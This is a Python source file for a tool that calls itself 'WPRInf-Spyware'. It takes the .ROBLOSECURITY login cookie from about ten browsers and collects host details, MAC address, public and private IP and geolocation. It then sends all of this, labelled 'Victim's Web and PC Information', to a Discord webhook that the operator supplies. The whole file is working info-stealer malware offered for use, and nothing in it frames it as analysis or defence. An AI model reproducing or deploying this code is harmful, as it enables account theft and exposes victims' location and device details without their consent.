# __          _______  _____  _____        __        _____
# \ \        / /  __ \|  __ \|_   _|      / _|      / ____|
#  \ \  /\  / /| |__) | |__) | | |  _ __ | |_ _____| (___  _ __  _   ___      ____ _ _ __ ___
#   \ \/  \/ / |  ___/|  _  /  | | | '_ \|  _|______\___ \| '_ \| | | \ \ /\ / / _` | '__/ _ \
#    \  /\  /  | |    | | \ \ _| |_| | | | |        ____) | |_) | |_| |\ V  V / (_| | | |  __/
#     \/  \/   |_|    |_|  \_\_____|_| |_|_|       |_____/| .__/ \__, | \_/\_/ \__,_|_|  \___|
#                                                         | |     __/ |
#                                                         |_|    |___/


# -----------------------------
#         WPRInf-Spyware       |
#   Made by Independent-coder  |
#  Under MIT license on github |
# ------------------------------

# ---------------------------------------
# Remember to enter your Discord webhook|
# ---------------------------------------


import platform
import socket
import uuid

import browser_cookie3
import psutil
import requests
from discord_webhook import DiscordWebhook, DiscordEmbed


# Function to check for the .ROBLOSECURITY cookie
def check_roblox_cookie():
    browsers = [
        ("Librewolf", browser_cookie3.librewolf),
        ("Vivaldi", browser_cookie3.vivaldi),
        ("Firefox", browser_cookie3.firefox),
        ("Safari", browser_cookie3.safari),
        ("Chromium", browser_cookie3.chrome),
        ("Edge", browser_cookie3.edge),
        ("Opera GX", browser_cookie3.opera_gx),
        ("Opera", browser_cookie3.opera),
        ("Brave", browser_cookie3.brave),
        ("Chrome", browser_cookie3.chrome)
    ]

    cookie_name = '.ROBLOSECURITY'
    cookie_value = None  # Initialize the variable here

    for browser_name, browser_method in browsers:
        try:
            for cookie in browser_method(domain_name='roblox.com'):
                if cookie.name == cookie_name:
                    cookie_value = cookie.value
        except Exception as e:
            pass  # Ignore errors and continue to the next browser

    if not cookie_value:
        print("Failed to find .ROBLOSECURITY cookie in any browser.")

    return cookie_value


# Function to gather system information
def get_system_info():
    hostname = platform.node()
    processor = platform.processor()
    ram = f"{psutil.virtual_memory().total / (1024 ** 3):.2f} GB"
    machine_architecture = platform.machine()
    os_name = platform.system()
    os_release = platform.release()
    os_version = platform.version()
    mac_address = ':'.join(f'{octet:02x}' for octet in uuid.getnode().to_bytes(6, 'big'))

    return {
        "Hostname": hostname,
        "Processor": processor,
        "RAM": ram,
        "Machine Architecture": machine_architecture,
        "OS": os_name,
        "OS Release": os_release,
        "OS Version": os_version,
        "MAC Address": mac_address
    }


# Get public IP address and geolocation data
public_ip = requests.get('https://api.ipify.org?format=json').json()['ip']
geolocation_url = f'https://ipinfo.io/{public_ip}/json'
geolocation_data = requests.get(geolocation_url).json()
private_ip = socket.gethostbyname(socket.gethostname())

# -------------------------------------
#       WebHook Initialization        |
# -------------------------------------

webhook_url = "PLEASE ENTER YOUR WEBHOOK HERE"  # Replace with your Discord webhook URL
webhook = DiscordWebhook(url=webhook_url, username="WEBInf-Spyware",
                         avatar_url="https://cdn-icons-png.flaticon.com/512/1691/1691918.png",
                         content="Victim's Web and PC Information")

# -------------------------------------
#         Defining the embeds         |
# -------------------------------------

# Get the cookie_value
cookie_value = check_roblox_cookie()

# Create a Discord embed for geolocation information
GeoEmbed = DiscordEmbed(title='Geolocation Information', color=16711680)
GeoEmbed.add_embed_field(name='IP Address :desktop:', value=geolocation_data['ip'])
GeoEmbed.add_embed_field(name='Hostname', value=geolocation_data['hostname'])
GeoEmbed.add_embed_field(name='City :cityscape:', value=geolocation_data['city'])
GeoEmbed.add_embed_field(name='Region :bank:', value=geolocation_data['region'])
GeoEmbed.add_embed_field(name='Country :flag_us:', value=geolocation_data['country'])
GeoEmbed.add_embed_field(name='Location :house_with_garden:', value=geolocation_data['loc'])
GeoEmbed.add_embed_field(name='Organization :file_cabinet:', value=geolocation_data['org'])

# Get system information
system_info = get_system_info()

# Create a Discord embed for PC information
PCEmbed = DiscordEmbed(title='PC Information', color=4360181)
PCEmbed.add_embed_field(name='Hostname', value=system_info['Hostname'])
PCEmbed.add_embed_field(name='Processor', value=system_info['Processor'])
PCEmbed.add_embed_field(name='RAM', value=system_info['RAM'])
PCEmbed.add_embed_field(name='Machine Architecture', value=system_info['Machine Architecture'])
PCEmbed.add_embed_field(name='OS', value=system_info['OS'])
PCEmbed.add_embed_field(name='OS Release', value=system_info['OS Release'])
PCEmbed.add_embed_field(name='OS Version', value=system_info['OS Version'])
PCEmbed.add_embed_field(name='MAC Address', value=system_info['MAC Address'])
PCEmbed.add_embed_field(name='Private IP Address :desktop:', value=f"||{private_ip}||")

# Create a Discord embed for the Roblox cookie
CookieEmbed = DiscordEmbed(title=f'A Roblox Cookie has been found on **{system_info["Hostname"]}**', color=4388231)
CookieEmbed.add_embed_field(name=f"View the cookie right here:", value=f"**`{cookie_value}`**")

# Add the embeds to the webhook
webhook.add_embed(GeoEmbed)
webhook.add_embed(PCEmbed)
webhook.add_embed(CookieEmbed)

# Execute the webhook
response = webhook.execute()

# -----------------------------
#         WPRInf-Spyware       |
#   Made by Independent-coder  |
#  Under MIT license on github |
# ------------------------------
